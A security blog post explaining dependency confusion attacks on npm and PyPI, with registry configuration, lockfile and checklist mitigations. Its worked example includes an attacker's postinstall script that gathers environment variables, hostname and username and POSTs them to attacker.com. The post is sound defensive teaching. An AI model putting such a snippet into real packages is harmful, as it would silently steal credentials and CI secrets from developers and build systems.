---
title: "Dependency Confusion: How a Typo Can Hand Attackers Your Production Server 📦💀"
date: "2026-03-23"
excerpt: "In 2021, a security researcher earned $130,000 by uploading fake packages to npm, PyPI, and RubyGems — and they executed code on machines at Apple, Microsoft, and Tesla. Your package manager might be doing the same thing to you right now."
tags: ["security", "supply-chain", "npm", "python", "dependencies"]
featured: true
---

# Dependency Confusion: How a Typo Can Hand Attackers Your Production Server 📦💀

Here's a fun game: guess how much money Alex Birsan made in bug bounties by writing packages that did nothing except phone home to his server.

**$130,000.** From Apple, Microsoft, Netflix, Shopify, Tesla, and 30 other companies.

He didn't find a zero-day. He didn't reverse-engineer binaries. He uploaded packages with the right names to the wrong registries — and package managers at Fortune 500 companies obediently installed them in CI/CD pipelines and developer laptops.

That attack is called **dependency confusion**, and there's a decent chance your project is vulnerable to it right now. Let's fix that. 🎯

## What Even Is Dependency Confusion? 🤔

Every company eventually builds internal packages. Maybe it's `@acme/auth-utils`, `acme-shared-models`, or just `internal-helpers`. These live on private registries — Artifactory, GitHub Packages, AWS CodeArtifact, whatever your team uses.

Here's the problem: most package managers, when they can't find a package on the private registry, **fall through to the public registry**. The logic seems reasonable — "maybe it's a public dependency we haven't cached yet."

An attacker who discovers your internal package names can upload a **higher-versioned** public package with the same name. Package managers that prioritize version numbers over registry origin will cheerfully download and execute the attacker's code instead of yours.

```
Your internal registry: @acme/auth-utils @ 1.2.3
Attacker's public npm:  @acme/auth-utils @ 99.0.0  ← "newer", wins
```

When your CI pipeline runs `npm install`, it sees version 99.0.0 > 1.2.3 and downloads the attacker's package. Your pipeline just executed arbitrary code with whatever permissions your CI runner has.

## How Attackers Find Your Internal Package Names 🕵️

You might think "but nobody knows what I call my internal packages!" Surprise:

- **Error messages in stack traces** posted to Stack Overflow or GitHub issues
- **`package.json` files committed to public repos** (happens constantly)
- **Job postings** that mention specific internal tooling
- **Docker layer leaks** from poorly written Dockerfiles
- **npm audit output** that gets copy-pasted into public bug reports

Internal package names leak all the time. Security through obscurity is not a strategy.

## A Concrete Example 🔬

Say your Node.js project depends on a private package:

```json
// package.json - your internal app
{
  "name": "my-internal-api",
  "dependencies": {
    "@acme/database-utils": "^2.1.0"
  }
}
```

And your `.npmrc` is configured like this:

```ini
# .npmrc - the dangerous version
registry=https://registry.npmjs.org/
@acme:registry=https://npm.acme.internal/
```

This looks fine — scoped packages go to the internal registry. But what if npm falls back to the public registry when the internal one is slow, unavailable, or returns a 404? Or what if a developer runs `npm install` on a machine where the internal registry isn't configured?

An attacker uploads `@acme/database-utils@999.0.0` to public npm with a `postinstall` script:

```javascript
// The "package" the attacker uploads — executes on install
// install.js (referenced in package.json postinstall)
const os = require('os');
const https = require('https');

// Exfiltrate environment variables, hostname, user
const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: process.env,  // AWS_SECRET_ACCESS_KEY? CI tokens? Hello! 👋
  platform: os.platform()
});

https.request({ hostname: 'attacker.com', path: '/collect', method: 'POST' }, () => {})
  .end(data);
```

This runs automatically during `npm install`. No user interaction required. No "are you sure?" prompt. Just silent exfiltration of every environment variable — including your `AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, CI tokens, and whatever else lives in your environment.

## How to Actually Fix This ✅

The good news: mitigation is straightforward once you know what to do.

**1. Pin to your private registry explicitly**

For npm, use scoped package rules with `//` fallback disabled:

```ini
# .npmrc - the safe version
@acme:registry=https://npm.acme.internal/
# Optionally: disable fallback to public registry for scoped packages
```

For pip, use `--index-url` (not `--extra-index-url`) so there's only ONE source:

```bash
# Dangerous - searches both, takes highest version
pip install --extra-index-url https://pypi.acme.internal/ acme-utils

# Safe - only checks your private registry
pip install --index-url https://pypi.acme.internal/ acme-utils
```

The difference matters. `--extra-index-url` searches both registries. `--index-url` replaces the default.

**2. Reserve your package names on public registries**

Even if you never intend to publish publicly, register your internal package names on npm/PyPI/RubyGems as empty placeholder packages. This prevents attackers from squatting the names.

It's free, takes 5 minutes, and closes the attack vector entirely.

**3. Use integrity hashes and lockfiles**

`package-lock.json`, `Pipfile.lock`, and `poetry.lock` pin exact versions and include integrity hashes. A confused package at version 99.0.0 won't match the expected hash — the install will fail rather than succeed silently.

```bash
# Fail on hash mismatch instead of silently installing wrong package
npm ci  # uses package-lock.json strictly
pip install --require-hashes -r requirements.txt
```

**4. Restrict what `postinstall` scripts can do in CI**

If you're running npm in a CI environment, consider:

```bash
# Disable all lifecycle scripts - postinstall won't run
npm install --ignore-scripts

# Or use a security-focused package manager
npx pnpm install  # pnpm has better isolation defaults
```

Tradeoff: some legit packages need postinstall (native bindings, etc.). Know your dependencies.

## The Bigger Picture: Supply Chain Security 🏗️

Dependency confusion is one flavor of supply chain attack. The broader category includes:

- **Typosquatting** — `reqeusts` instead of `requests` (Python)
- **Dependency hijacking** — taking over an abandoned package a popular project depends on
- **Maintainer account compromise** — stealing npm credentials to push malicious versions
- **Malicious PRs** — contributing code to open source projects that introduces backdoors

The common thread: you don't control what runs when you run `npm install`. Every dependency is implicit trust.

**Treat your `package.json` like a security document.** Audit it. Pin versions. Review what's in your lockfile. Consider tools like `npm audit`, Snyk, or Socket.dev as part of your pipeline.

Your attack surface isn't just your code — it's everything your code runs with. In 2024, the XZ Utils backdoor nearly compromised SSH on half the internet. The attacker spent *two years* building trust as an open source contributor before inserting the malicious code. Supply chain attacks are patient, targeted, and devastating.

## Quick Checklist 🛡️

Before you close this tab, check these three things:

- [ ] Are your internal package names registered as placeholder packages on public registries?
- [ ] Does your `.npmrc`/`pip.conf` use `--index-url` instead of `--extra-index-url`?
- [ ] Are you running `npm ci` (lockfile-based) rather than `npm install` in CI?

If you answered "no" or "I don't know" to any of these, you've got work to do. The good news: it's a couple hours of work that closes a genuinely dangerous attack vector.

Don't be the company in next year's bug bounty writeup. 🔒

---

Found this useful? Share it with your team — supply chain security is a collective problem that requires collective awareness. Hit me up on [Twitter/X](https://twitter.com/kpanuragh) or [GitHub](https://github.com/kpanuragh) if you've got questions or have dealt with a dependency confusion incident. I'd love to hear how it played out.
